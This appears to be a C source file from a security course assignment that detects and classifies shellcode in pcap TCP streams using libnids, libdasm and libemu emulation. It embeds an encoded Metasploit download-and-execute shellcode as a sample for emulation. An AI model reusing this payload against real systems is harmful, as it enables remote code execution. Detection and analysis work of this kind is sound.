#include <nids.h>
#include <arpa/inet.h>
#include <emu/emu.h>
#include <emu/emu_cpu.h>
#include <emu/emu_memory.h>
#include <emu/emu_cpu_data.h>
#include <emu/environment/emu_env.h>
#include <emu/environment/win32/emu_env_w32.h>
#include <emu/environment/win32/emu_env_w32_dll_export.h>
#include "libdasm.h"
#include "code_distr.h"

#include <stdio.h>
#include <stdlib.h>
#include <math.h>

#define MODE_STRIDE 0
#define MODE_SELFCONTAINED 1
#define MODE_NONSELFCONTAINED 2

// STRIDE Heuristic Parameters
#define STRIDE_MIN_SLED 10

// Self-contained Heuristic Parameters
#define SC_PRT 35
#define SC_XT 2048

// Non-self-contained Heuristic Parameters
#define NSC_MIN_WRITES 2
#define NSC_MIN_WX 2
#define NSC_XT 10000

// Encoder Labels (classify encoding function should return one)
#define ENC_ALPHA_MIXED         0
#define ENC_AVOID_UTF8_TOLOWER  1
#define ENC_CALL4_DWORD_XOR     2
#define ENC_COUNTDOWN           3
#define ENC_FNSTENV_MOV         4
#define ENC_SHIKATA_GA_NAI      5
#define ENC_UNKNOWN             6


#define MAX_ERR  0.3


// Payload/Functional Labels (classify payload function should return one)         
#define FUNC_ADDUSER            0 
#define FUNC_FTPEXEC            1 
#define FUNC_HTTPEXEC           2 
#define FUNC_CONNECTEXEC        3 
#define FUNC_BINDSHELL          4 
#define FUNC_BINDEXEC           5 
#define FUNC_UNKNOWN            6 

// Detection Mode
int mode = 0;

// LibEmu Globals
#define STATIC_OFFSET 0x417000
struct emu *e;
struct emu_cpu *cpu;
struct emu_memory *mem;

// We keep track of these statistics for you
double stats_flows = 0;
double stats_shellcodes = 0;
uint32_t stats_enc_alpha = 0;
uint32_t stats_enc_avoid = 0;
uint32_t stats_enc_call4 = 0;
uint32_t stats_enc_count = 0;
uint32_t stats_enc_fnstenv = 0;
uint32_t stats_enc_shikata = 0;
uint32_t stats_enc_unknown = 0;
uint32_t stats_func_adduser = 0;
uint32_t stats_func_ftpexec = 0;
uint32_t stats_func_httpexec = 0;
uint32_t stats_func_connectexec = 0;
uint32_t stats_func_bindshell = 0;
uint32_t stats_func_bindexec = 0;
uint32_t stats_func_unknown = 0;

FILE *offsetfile;
/*********************************************************/
/* libemu sample code (run with "./as2 3")                 */
/*********************************************************/

/*
 * windows/download_exec - 402 bytes
 * http://www.metasploit.com
 * Encoder: x86/fnstenv_mov
 * URL=http://libemu.carnivore.it/about.html
 */
int sample_shellcode_len = 402;
unsigned char sample_shellcode[] = 
"\x6a\x5f\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xe0\x4b"
"\x79\xde\x83\xeb\xfc\xe2\xf4\x0b\x5b\x23\x94\xd3\x82\x1f\x67"
"\xdc\x4a\xf9\xea\xea\xd2\x9b\x24\x0b\x4e\x91\x35\x1f\xb4\x86"
"\xae\xac\xd2\xe0\x47\x23\xb6\x41\x77\x79\xd2\xe0\xcc\x39\xde"
"\x6b\x37\x65\x7f\x6b\x07\x71\x59\x38\xcc\x0a\xee\x6b\x33\x67"
"\xaa\xe3\xb4\xf2\xac\xc0\x44\x82\x59\xae\x53\x4a\x3f\xb6\x10"
"\x28\x59\xdf\x44\x82\x59\x12\x2d\x77\x8b\x13\xe1\x0d\xda\xb9"
"\x18\xfa\x15\xe4\x02\x9b\x3b\xb9\x18\x27\x59\x2d\xcc\x3f\xf6"
"\xe3\x84\xa8\x33\xe3\x86\x4a\x1b\x86\xcc\x71\x59\xa6\x5b\x7a"
"\x11\x21\xa6\x7b\xd1\x21\xcc\x79\xd1\x23\xcc\x83\x59\x17\xc4"
"\xbf\xdc\x6b\x97\x13\xd6\xb9\xaf\x29\xd2\xe0\x47\xfa\x14\xed"
"\x15\x2f\x2d\xb7\xbb\x23\x59\x38\x2d\x78\x8b\x08\x7a\x79\xd2"
"\xe0\xc4\xbf\xc1\xb6\x01\xf9\xec\x60\x32\x83\x52\xd6\xc7\x27"
"\x51\x0c\x67\xf2\x0e\x8a\x67\x2a\x2d\xb7\xab\xbe\xd6\xe3\x1b"
"\x18\xfc\x85\x80\x3d\xd1\xe4\x3f\x1c\xd2\xe0\x74\xb9\x82\xb0"
"\x14\x2f\x82\x1f\x10\x85\x59\x3c\x17\x2a\x2d\xb7\xb7\x29\x2d"
"\xb7\xb3\x4a\x12\x4c\xc2\xb9\xa7\x19\x16\x2b\x84\xb3\xb8\xab"
"\x88\xb9\xec\x9b\x3c\xd3\x87\xba\x3a\xc6\xb8\x86\x2d\xa7\x22"
"\x0d\x82\x92\x28\x1a\x93\x84\x23\x0b\xb7\x93\x34\x79\x95\x85"
"\x33\x2a\xab\x93\x33\x1c\xbf\xa4\x2e\x0b\xb7\x83\x33\x16\xa0"
"\x99\x06\x79\x85\x89\x29\x3c\xaa\x85\x24\x79\x97\x98\x2e\x0d"
"\x86\x88\x35\x1c\xb3\x84\x47\x35\xbd\x81\x23\x35\xbb\x82\x35"
"\x18\xa0\x99\x06\x79\xa7\x92\x2b\x14\xbd\x8e\x47\x2c\x80\xac"
"\x03\x16\xa5\x8e\x2b\x16\xb3\x84\x13\x16\x94\x89\x2b\x1c\x93"
"\xe0\xb6\x94\x3f\x09\xe4\xcf\x64\x15\xb7\x82\x2e\x14\xab\xce"
"\x28\x18\xac\x8e\x22\x0f\xb1\x92\x2e\x57\xb7\x94\x64\x18\xbc"
"\x8f\x3e\x0d\xf0\x88\x3f\x14\xb2\x60\x4b\x79\xde";

/*
 * Clears memory, resets registers to 0, writes buf to memory and
 * sets the instruction pointer to the beginning of buf
 */
void reset_CPU(char *buf, int buf_len)
{
	int reg;
	emu_memory_clear(mem);
	emu_cpu_eflags_set(cpu,0x0);
	for (reg=0;reg<8;reg++)
		emu_cpu_reg32_set(cpu,reg ,0x0);
	emu_memory_write_block(mem, STATIC_OFFSET, buf, buf_len);
	emu_cpu_eip_set(cpu, STATIC_OFFSET);
	emu_cpu_reg32_set(cpu, esp, 0x00120000);
}

/*
 * Demonstrates the use of libemu by stepping through the sample
 * shellcode and printing out some useful information
 */
void libemu_sample() 
{
	char eastr[256];
	char apicall[256];
	char str_param[1024];
	uint32_t ea, param_pointer, str_pointer;
	struct emu_env *w32api;
	struct emu_env_hook *hook = NULL; 

	reset_CPU(sample_shellcode, sample_shellcode_len); 
	w32api = emu_env_new(e);
	do
	{	
		// Parse the instruction		if (emu_cpu_parse(emu_cpu_get(e)) == -1) break;
		
		// Check for memory read/write by checking each 
		// instruction's effective address (hack)
		ea = (&cpu->instr.cpu)->modrm.ea;
		if (ea > 0)
			sprintf(eastr,"(effective address: 0x%08x)",ea);
		else
			sprintf(eastr,"");

		// Execute the instruction
		if (emu_cpu_step(emu_cpu_get(e)) == -1)  break;

		// Check if a windows API call was made
		hook = emu_env_w32_eip_check(w32api);
		sprintf(str_param,"");
		if (hook != NULL)
		{
			sprintf(apicall,"(%s)", hook->hook.win->fnname);
			
			// Grab an API call parameter value from emu memory
			// (you could also use libemu's api hooking functions)
			if (strcmp("(URLDownloadToFileA)",apicall) == 0)
			{
				// Get location of our parameter on the stack (use Windows API documentation)
				param_pointer = emu_cpu_reg32_get(cpu,esp)-sizeof(uint32_t)*4; // count backwards
				// Get the value at that location (the parameter)
				emu_memory_read_dword(mem,param_pointer,&str_pointer);
				// In our case, we know its a pointer to a string, so get the value at that pointer
				emu_memory_read_block(mem,str_pointer,str_param,1023);
			} 	
		}
		else
			sprintf(apicall,"");
			
		// Print some info about our current state
		printf("0x%08x: %s %s %s %s\n", cpu->eip, cpu->instr_string, eastr, apicall, str_param);
				
		(&cpu->instr.cpu)->modrm.ea = 0; // Reset so we can track new ea's
	} while (strcmp("(ExitThread)",apicall) != 0);
	
	emu_env_free(w32api);
	
	return;
}

/*********************************************************/
/* (1a) STRIDE                                           */
/*********************************************************/


int detect_with_stride_heuristic(char *buf, int buf_len) 
{
	/*
	 * For an example of using libdasm to parse instructions
	 * See: http://code.google.com/p/libdasm/source/browse/trunk/examples/das.c
	 *
	 * You may also find INSTRUCTION.type defined in libdasm.h in
	 * enum Instruction {…}
	 *
	 */
	 INSTRUCTION inst; 
	 int i, j, c, bytes, format = FORMAT_INTEL, len;
         char string[256];
	 int sled_length ;

/*
	 for (i = 0; i< buf_len - sled_length; i++){
		if(find_sled(buf + i, sled_length))
			return 1;
	}
*/

	 for (sled_length = 1; sled_length < 4; sled_length++){
		 for (j = 0; j < buf_len - sled_length; j++){
		 int have_many_nops = 0;
		 int decode_success = 0;
		 c = j;
		 while (c < buf_len){
			len = get_instruction(&inst, buf + c, MODE_32);
	
			// Illegal opcode or 
			// opcode longer than remaining buffer
			// could not get valid asm code
			if (!len || (len + c > buf_len) || len != sled_length){
				return -1;
                	} 

			BYTE op = inst.opcode;
			//printf("%02X \n", (int)op);
			if (op == 90){
				decode_success++;
				if (decode_success >  STRIDE_MIN_SLED)
					have_many_nops = 1;
			}

			// type == JMPC
			else if (inst.type == INSTRUCTION_TYPE_JMPC)
				return c;
			else{
				if (have_many_nops)
					return c;
				decode_success++;
				if (decode_success > STRIDE_MIN_SLED)
					return c;				
			}
        	        c += sled_length;
        	}
		}
	}
	 

	 return -1;
}

/*********************************************************/
/* (1b) Self-contained network emulation                 */
/*********************************************************/

int detect_with_selfcontained_heuristic(char *buf, int buf_len) 
{
	/* Implement Heuristic II, return offset */
	// detect getPC: detect unusual large amount of push opcode
	// detect many writes to the payload: detect unusualy large amount of 
	// ARITH_OP [ecx], edi
	INSTRUCTION inst;
        int i, j, k, c = 0, bytes, format = FORMAT_INTEL, len, is_shell = 0;	

	for (k = 0 ; k < buf_len; k++){
		c = k;
		int num_push = 0;
		int num_write_payload = 0;	
		int num_ex = 0;
	while (c < buf_len){
		len = get_instruction(&inst, buf + c, MODE_32);
		int reg = inst.op1.reg;
		BYTE op = inst.opcode;

		num_ex++;
		if (!len || (len + c > buf_len - k) || len == 0){
			break;
               	} 
		if (inst.type == INSTRUCTION_TYPE_PUSH)
			num_push++;
		if (inst.type == INSTRUCTION_TYPE_ADD ||
		    inst.type == INSTRUCTION_TYPE_SUB ||
                    inst.type == INSTRUCTION_TYPE_OR ||
                    inst.type == INSTRUCTION_TYPE_AND ||
                    inst.type == INSTRUCTION_TYPE_XOR ||
                    inst.type == INSTRUCTION_TYPE_ADC ||
		    inst.type == INSTRUCTION_TYPE_DIV ||
		    inst.type == INSTRUCTION_TYPE_IDIV ||
		    inst.type == INSTRUCTION_TYPE_MUL ||
		    inst.type == INSTRUCTION_TYPE_SBB 
               	 )
			num_write_payload++;		
//		printf("%d\t%d\n", num_push, num_write_payload);
		if (num_write_payload > SC_PRT  || num_ex > SC_XT){
			return c ;
		}
		c += len;
	}
	}
	return -1;
}

/*********************************************************/
/* (1c) Non-self-contained network emulation             */
/*********************************************************/

int detect_with_nonselfcontained_heuristic(char *buf, int buf_len) 
{
	/*
	 * Implement Heuristic III, return offset
	 *
	 * (tip: don't set esp to point to the buffer)
	 */
        char eastr[256];
        char apicall[256];
        char str_param[1024];
        uint32_t ea, param_pointer, str_pointer;
	int k, c = 0;
	int i = 0;
	int size_cache = 2000;

	uint32_t recent_mem_addr [size_cache];

//        reset_CPU(sample_shellcode, sample_shellcode_len);

	for (k = 0; k < buf_len; k++){
        	reset_CPU(buf + k, buf_len -k);
		int num_ex = 0;	
		int num_uniq_writes = 0;
		int num_wx_inst = 0;
		int index = 0;
		c = k;
	
		//clean cache
		for (i = 0; i < size_cache; i++)
			recent_mem_addr[i] = 0;
	while (emu_cpu_parse(emu_cpu_get(e)) != -1){
		INSTRUCTION inst;
		num_ex++;
		int  len = get_instruction(&inst, buf + c, MODE_32);
		if (len == 0 || len + c > buf_len -k )
			break;

//		printf("%d\t%d\t%d\t%d\n", c, num_ex, num_wx_inst, num_uniq_writes);
                // Check for memory read/write by checking each
                // instruction's effective address (hack)
                ea = (&cpu->instr.cpu)->modrm.ea;
//		printf("%u\t", ea);
                if (ea > 0){	// write to memory
			int found = 0;
			for (i = 0; i < size_cache; i++){
				if (recent_mem_addr[i] == ea){
					found = 1;
				}
			}
			if (found == 0){
				recent_mem_addr[index] = ea;
				index = ++index % size_cache;
				num_uniq_writes++;
			}
		}

                // Execute the instruction
                if (emu_cpu_step(emu_cpu_get(e)) == -1)  break;
		
		// get eip which points to currect instruction address in memory
		//printf("%u\t", pc); 
              // Print some info about our current state
//                printf("0x%08x: %s %s %s\n", cpu->eip, cpu->instr_string, eastr, str_param);

		for (i = 0; i < size_cache; i++){
			if (recent_mem_addr[i] == 0)
				break;
//			printf("0x%08x\t", recent_mem_addr[i]);
			if (cpu->eip <= recent_mem_addr[i] && cpu->eip + len >= recent_mem_addr[i]){
				num_wx_inst++;
				break;
			}
		}
		if (num_ex > NSC_XT){
			return c ;
		}
      		if (num_uniq_writes > NSC_MIN_WRITES && num_wx_inst > NSC_MIN_WX){
			return c ;
		}
		c+= len;
END_WHILE:
	;
	}
	 
	}

	return -1;
}

/*********************************************************/
/* (2) Functional Classification                         */
/*********************************************************/

int classify_function(char *buf, int buf_len, char *info) 
{
	/* 
	 * Return one of the predefined values, sprintf()
	 * your descriptive string into *info
	 */	
	
	char eastr[256];
	char apicall[256];
	char str_param[1024];
	uint32_t ea, param_pointer, str_pointer;
	struct emu_env *w32api;
	struct emu_env_hook *hook = NULL; 
	int function = FUNC_UNKNOWN;;

	int k;

	
	reset_CPU(buf, buf_len); 
	w32api = emu_env_new(e);
	do
	{	
		// Parse the instruction	
		if (emu_cpu_parse(emu_cpu_get(e)) == -1) 
			break;
		
		// Check for memory read/write by checking each 
		// instruction's effective address (hack)
		//ea = (&cpu->instr.cpu)->modrm.ea;
		//if (ea > 0)
		//	sprintf(eastr,"(effective address: 0x%08x)",ea);
		//else
		//	sprintf(eastr,"");

		// Execute the instruction
		if (emu_cpu_step(emu_cpu_get(e)) == -1)  break;

		// Check if a windows API call was made
		hook = emu_env_w32_eip_check(w32api);
		sprintf(str_param,"");
		if (hook != NULL)
		{
			sprintf(apicall,"(%s)", hook->hook.win->fnname);
			
			// Grab an API call parameter value from emu memory
			// (you could also use libemu's api hooking functions)
			printf("%s\n", apicall);
			if (strcmp("(AddUser)",apicall) == 0)
				return FUNC_ADDUSER; 
			else if (strcmp("(WinExec)",apicall) == 0)
				return FUNC_FTPEXEC;
			else if (strcmp("(connect)",apicall) == 0)
				return FUNC_CONNECTEXEC;
			else if (strcmp("(WaitForSingleObject)",apicall) == 0)
				return FUNC_BINDSHELL;
			else if (strcmp("(bind)",apicall) == 0)
				return FUNC_BINDEXEC;
			else if (strcmp("(URLDownloadToFileA)",apicall) == 0)
				return FUNC_HTTPEXEC;
			else 
				function = FUNC_UNKNOWN;
		}
		else
			;	
		// Print some info about our current state
		//printf("0x%08x: %s %s %s %s\n", cpu->eip, cpu->instr_string, eastr, apicall, str_param);
				
		(&cpu->instr.cpu)->modrm.ea = 0; // Reset so we can track new ea's
	} while (strcmp("(ExitThread)",apicall) != 0);
	
	emu_env_free(w32api);

	return function;
}

/*********************************************************/
/* (3) Encoder Classification                            */
/*********************************************************/

int classify_encoder(char * buf, int buf_len)
{
	/* Return one of the predefined values */
	
	INSTRUCTION inst;
        int i, j, c = 0, bytes, format = FORMAT_INTEL, len;	

	char ip1[80], ip2[80];
	int offset, port1, port2;

	float num_inst = 0, num_mov = 0, num_pop = 0, num_push = 0, num_cmp = 0,
	      num_jmp = 0, num_arith = 0, num_logic = 0, num_test = 0, num_loop = 0,
	      num_other = 0;
/*
	// collecting code distribution data from enc_* files	
	char buffer[200];
	char *result = NULL;
	if (!feof(offsetfile)){		
		fgets(buffer, 200, offsetfile);
		int k;
		result = strtok(buffer, ",");
		for (k = 0; k < 4; k++){
			result = strtok(NULL, "," );
		}
		offset = atoi(result);
	}
	else
		return ENC_UNKNOWN;

	c = offset + 1;
*/
	while (c < buf_len){
		len = get_instruction(&inst, buf + c, MODE_32);
		 if (!len || (len + c > buf_len - offset) || len == 0)
			break;

		num_inst++;

		if ((inst.type == INSTRUCTION_TYPE_ADD) ||
		   (inst.type == INSTRUCTION_TYPE_SUB) ||
		   (inst.type == INSTRUCTION_TYPE_INC) ||
		   (inst.type == INSTRUCTION_TYPE_DEC) ||
		   (inst.type == INSTRUCTION_TYPE_MUL) ||	
		   (inst.type == INSTRUCTION_TYPE_IMUL) ||
		   (inst.type == INSTRUCTION_TYPE_DIV) )
			num_arith++;


		else if ((inst.type == INSTRUCTION_TYPE_AND) ||
		   (inst.type == INSTRUCTION_TYPE_OR) ||
		   (inst.type == INSTRUCTION_TYPE_NOT) ||
		   (inst.type == INSTRUCTION_TYPE_XOR))
			num_logic++;

		else if ((inst.type == INSTRUCTION_TYPE_JMP) ||
                    (inst.type == INSTRUCTION_TYPE_JMPC))
                         num_jmp++;
	
		else if (inst.type == INSTRUCTION_TYPE_LOOP) 
			num_loop++;


		else if (inst.type == INSTRUCTION_TYPE_TEST) 
			num_test++;
		
		 else if (inst.type == INSTRUCTION_TYPE_PUSH)
			num_push++;

		 else if (inst.type == INSTRUCTION_TYPE_POP)
			num_pop++;

		 else if (inst.type == INSTRUCTION_TYPE_MOV)
			num_mov++;

		 else if (inst.type == INSTRUCTION_TYPE_CMP)
			num_cmp++;
		
		 else
			num_other++;
		
		 c += len; 

        }

//	printf("Percentage of instruction types\n");
//	printf("Arith\tLogic\tJmp\tLoop\tTest\tPush\tPop\tMov\tCmp\tOther\n");
//	printf("%f\t%f\t%f\t%f\t%f\t%f\t%f\t%f\t%f\t%f\n", num_arith/num_inst, num_logic/num_inst, num_jmp/num_inst, num_loop/num_inst,
//	num_test/num_inst, num_push/num_inst, num_pop/num_inst, num_mov/num_inst,
//	num_cmp/num_inst, num_other/num_inst);
	

	float distr [10] = { num_arith/num_inst, num_logic/num_inst, num_jmp/num_inst, num_loop/num_inst, num_test/num_inst, num_push/num_inst, num_pop/num_inst, num_mov/num_inst, num_cmp/num_inst, num_other/num_inst};
	float err = MAX_ERR , temp = 0;
	int l;
	int encoder = ENC_UNKNOWN;

	temp = 0.0;
	for (l = 0; l < 10; l++){
		temp += (distr[l] - alpha_mix[l]) * (distr[l] - alpha_mix[l]);
	}
	printf("\n");
	if (  (temp) < err){
		err = temp;
		encoder = ENC_ALPHA_MIXED;
	}

	temp = 0;
	for (l = 0; l < 10; l++)
		temp += (distr[l] - avoid_utf[l]) * (distr[l] - avoid_utf[l]);
	if ( (temp) < err){
		err = temp;
		encoder = ENC_AVOID_UTF8_TOLOWER;
	}

	temp = 0;
	for (l = 0; l < 10; l++)
		temp += (distr[l] - call4[l]) * (distr[l] - call4[l]);
	if ( (temp) < err){
		err = temp;
		encoder = ENC_CALL4_DWORD_XOR;
	}

	temp = 0;
	for (l = 0; l < 10; l++)
		temp += (distr[l] - countdown[l]) * (distr[l] - countdown[l]);
	if ( (temp) < err){
		err = temp;
		encoder = ENC_COUNTDOWN;
	}

	temp = 0;
	for (l = 0; l < 10; l++)
		temp += (distr[l] - fnstenv[l]) * (distr[l] - fnstenv[l]);
	if ( (temp) < err){
		err = temp;
		encoder = ENC_FNSTENV_MOV;
	}

	temp = 0;
	for (l = 0; l < 10; l++)
		temp += (distr[l] - shikata[l]) * (distr[l] - shikata[l]);
	if ( (temp) < err){
		err = temp;
		encoder = ENC_SHIKATA_GA_NAI;
	}
	temp = 0;

	if (err < MAX_ERR)
		return encoder;

	return ENC_UNKNOWN;
}

/*********************************************************/
/* Detection Mode & Reporting                            */
/*********************************************************/

#define int_ntoa(x)	inet_ntoa(*((struct in_addr *)&x))

/*
 * Formats and displays output based on results from your implementations
 * Takes a reassembled stream from libnids as input
 * Calls the appropriate shellcode heurisic based on the mode
 * Calls the function/payload classification function
 * Calls the encoding classification function
 * Prints result if shellcode found
*/
void analyze(char *buf, int len, struct tcp_stream *a_tcp)
{
	int offset,i;
	char function_class[256];
	char function_info[2560];
	char encoding_class[256];
	int function_id = -1;
	int encoding_id = -1;

	sprintf(function_info, "N/A");
	sprintf(function_class, "Unknown");
	sprintf(encoding_class, "Unknown");
	

	if (mode == MODE_STRIDE)
		offset = detect_with_stride_heuristic(buf,len);
	else if (mode == MODE_SELFCONTAINED)
		offset = detect_with_selfcontained_heuristic(buf,len);
	else if (mode == MODE_NONSELFCONTAINED)
		offset = detect_with_nonselfcontained_heuristic(buf,len);


	if (offset >= 0) // Detected shellcode
	{
		if (mode == MODE_SELFCONTAINED || mode == MODE_NONSELFCONTAINED)
		{
			function_id = classify_function(buf+offset, len-offset, function_info);
			encoding_id = classify_encoder(buf+offset, len-offset);
		
			switch (encoding_id)
			{
				case ENC_ALPHA_MIXED:
					sprintf(encoding_class, "alpha_mixed");
					stats_enc_alpha++;
					break;
				case ENC_AVOID_UTF8_TOLOWER:
					sprintf(encoding_class, "avoid_utf8_tolower");
					stats_enc_avoid++;
					break;
				case ENC_CALL4_DWORD_XOR:
					sprintf(encoding_class, "call4_dword_xor");
					stats_enc_call4++;
					break;
				case ENC_COUNTDOWN:
					sprintf(encoding_class, "countdown");
					stats_enc_count++;
					break;
				case ENC_FNSTENV_MOV:
					sprintf(encoding_class, "fnstenv_mov");
					stats_enc_fnstenv++;
					break;
				case ENC_SHIKATA_GA_NAI:
					sprintf(encoding_class, "shikata_ga_nai");
					stats_enc_shikata++;
					break;
				default: 
					sprintf(encoding_class, "Unknown");
					stats_enc_unknown++;
					break;
			};
			
			switch (function_id)
			{
				case FUNC_ADDUSER:
					sprintf(function_class, "AddUser");
					stats_func_adduser++;
					break;
				case FUNC_FTPEXEC:
					sprintf(function_class, "FTPExec");
					stats_func_ftpexec++;
					break;
				case FUNC_CONNECTEXEC:
					sprintf(function_class, "ConnectExec");
					stats_func_connectexec++;
					break;
				case FUNC_BINDSHELL:
					sprintf(function_class, "BindShell");
					stats_func_bindshell++;
					break;
				case FUNC_BINDEXEC:
					sprintf(function_class, "BindExec");
					stats_func_bindexec++;
					break;
				case FUNC_HTTPEXEC:
					sprintf(function_class, "HTTPExec");
					stats_func_httpexec++;
					break;
				default: 
					sprintf(function_class, "Unknown");
					stats_func_unknown++;
					break;
			};

		}
		
		printf ("%s:%i <-> %s:%i\t shellcode\t offset: %d\t %s\t %s\t ", 
				int_ntoa(a_tcp->addr.saddr), a_tcp->addr.source, 
				int_ntoa(a_tcp->addr.daddr), a_tcp->addr.dest,
				offset, encoding_class, function_class);
		for (i = 0; i < strlen(function_info); i++) 
		{	// Stop printing the returned function info string if bad character encountered
	        if ((function_info[i] >= 0 && function_info[i] <=31) || function_info[i] == 127)
	            break;
	        else
	            printf("%c", function_info[i]);
    	}
		printf("\n");
		
		stats_shellcodes++;
	}
	
	stats_flows++;
}

// Prints statistics after all streams have been processed
// to help assess your implementation
void print_stats()
{
	printf("\nNumber of Streams Analyzed: %d\n",(int)stats_flows);
	if (stats_flows == 0)
		return;
	printf("\n=== Detections          %% of total ===\n");
	printf("    shellcode           %.02f%% (%d)\n", stats_shellcodes/stats_flows*100,(int)stats_shellcodes);
	if (stats_shellcodes == 0 || mode == MODE_STRIDE)
		return;
	printf("\n=== Encoder             %% of detected ===\n");
	printf("    alpha_mixed         %.02f%% (%d)\n",stats_enc_alpha/stats_shellcodes*100,stats_enc_alpha);
	printf("    avoid_utf8_tolower  %.02f%% (%d)\n",stats_enc_avoid/stats_shellcodes*100,stats_enc_avoid);
	printf("    call4_dword_xor     %.02f%% (%d)\n",stats_enc_call4/stats_shellcodes*100,stats_enc_call4);
	printf("    countdown           %.02f%% (%d)\n",stats_enc_count/stats_shellcodes*100,stats_enc_count);
	printf("    fnstenv_mov         %.02f%% (%d)\n",stats_enc_fnstenv/stats_shellcodes*100,stats_enc_fnstenv);
	printf("    shikata_ga_nai      %.02f%% (%d)\n",stats_enc_shikata/stats_shellcodes*100,stats_enc_shikata);
	printf("    Unknown             %.02f%% (%d)\n",stats_enc_unknown/stats_shellcodes*100,stats_enc_unknown);
	printf("\n=== Payload Type        %% of detected ===\n");
	printf("    AddUser             %.02f%% (%d)\n",stats_func_adduser/stats_shellcodes*100,stats_func_adduser);
	printf("    FTPExec             %.02f%% (%d)\n",stats_func_ftpexec/stats_shellcodes*100,stats_func_ftpexec);
	printf("    HTTPExec            %.02f%% (%d)\n",stats_func_httpexec/stats_shellcodes*100,stats_func_httpexec);
	printf("    ConnectExec         %.02f%% (%d)\n",stats_func_connectexec/stats_shellcodes*100,stats_func_connectexec);
	printf("    BindShell           %.02f%% (%d)\n",stats_func_bindshell/stats_shellcodes*100,stats_func_bindshell);
	printf("    BindExec            %.02f%% (%d)\n",stats_func_bindexec/stats_shellcodes*100,stats_func_bindexec);
	printf("    Unknown             %.02f%% (%d)\n",stats_func_unknown/stats_shellcodes*100,stats_func_unknown);
	printf("\n");
}

/*********************************************************/
/* Stream Reassembly                                     */
/*********************************************************/

// Collects the first 65kb of streams from the client to the server
void tcp_server_callback (struct tcp_stream *a_tcp, void **empty)
{
	if ( a_tcp->nids_state == NIDS_JUST_EST )
	{
		a_tcp->server.collect++; 						  
		a_tcp->server.collect_urg++; 	
	} 
	else if ( a_tcp->nids_state == NIDS_CLOSE 
			|| a_tcp->nids_state == NIDS_RESET
			|| a_tcp->nids_state == NIDS_TIMED_OUT
			|| a_tcp->nids_state == NIDS_EXITING )
	{
		if ((&a_tcp->server)->offset == 0) // connection ended with unprocessed data
			analyze((&a_tcp->server)->data, (&a_tcp->server)->count, a_tcp);
	}  
	else if ( a_tcp->nids_state == NIDS_DATA )
	{
		if ((&a_tcp->server)->count >= 65536 && (&a_tcp->server)->offset == 0) // size limit reached, process
			analyze((&a_tcp->server)->data, (&a_tcp->server)->count, a_tcp);
		if ((&a_tcp->server)->count < 65536) 
			nids_discard(a_tcp, 0); // Dont discard unless max size captured
	}
	return;
}

// Libnids log handler, we don't do anything with it
void nothing(int type, int err, struct ip *iph, void *data) {}

// Initialize and start libnids reassembling streams from the given pcap file
void init_libnids(char *filename)
{
	nids_params.filename = strdup(filename);
	nids_params.syslog = nothing;
	nids_params.scan_num_hosts = 0;
	if ( !nids_init () )
	{
		fprintf(stderr,"%s\n",nids_errbuf);
		return;
	}
	struct nids_chksum_ctl disable_checksums;
	disable_checksums.netaddr = 0;
	disable_checksums.mask    = 0;
	disable_checksums.action  = NIDS_DONT_CHKSUM;
	nids_register_chksum_ctl(&disable_checksums,1);
	nids_register_tcp(tcp_server_callback);
	nids_run();
	return;
}

/*********************************************************/
/* libemu helpers                                        */
/*********************************************************/

/* Initialized in the main() function */
void init_libemu()
{
	e = emu_new();
	cpu = emu_cpu_get(e);
	mem = emu_memory_get(e);
	emu_memory_clear(mem);
	return;
}

/* Unallocated in the main() function */
void free_libemu()
{
	emu_free(e);
	return;
}

/*********************************************************/
/* MAIN                                                  */
/*********************************************************/

void print_usage(char *name)
{
	printf("usage %s <mode> <pcap_file>\n", name);
	printf("\t Stride Mode = 0\n");
	printf("\t Self-contained Mode = 1\n");
	printf("\t Non-self-contained Mode = 2\n");
	printf("\t libemu sample code = 3\n");
	return;
}

int main (int argc, const char *argv[])
{
	if (argc < 2)
	{
		print_usage((char*)argv[0]);
		return -1;
	}	
	mode = atoi(argv[1]);
	
	if ((mode != 3 && argc < 3) || mode < 0 || mode > 3)
	{
		print_usage((char*)argv[0]);
		return -1;	
	}
	
	if (mode == 3) // run the sample code, then quit
	{
		init_libemu();
		libemu_sample();
		free_libemu();
		return 0;	
	}

	if (argv[3])	
		offsetfile = fopen((char*)argv[3], "r");

	init_libemu();
	init_libnids((char*)argv[2]);
	free_libemu();
	
	print_stats();

	return 0;

}
